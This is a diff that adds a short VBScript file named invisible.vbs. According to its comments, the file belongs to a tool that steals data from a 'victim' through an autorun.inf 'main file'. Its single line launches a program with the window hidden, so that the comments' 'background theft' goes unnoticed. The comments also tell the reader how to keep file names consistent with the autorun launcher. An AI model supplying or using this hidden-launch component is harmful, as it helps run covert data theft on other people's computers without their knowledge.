@@ -1,0 +1,10 @@
+// this file contains the code to maKE ALL THE OTHER FILES INVISIBLE ie the victim will not be 
+//able to see the bacgroung theft we are doing
+
+
+CreateObject("Wscript.Shell").Run""""&WScript.Arguments(0)&"""",0,False
+
+//save this as invisible.vbs 
+//NOTE: you might change the names of the files but take care of the names as the main file will call these by their names
+//so we need to make changes in the code of the main file too(autorun.inf)
+
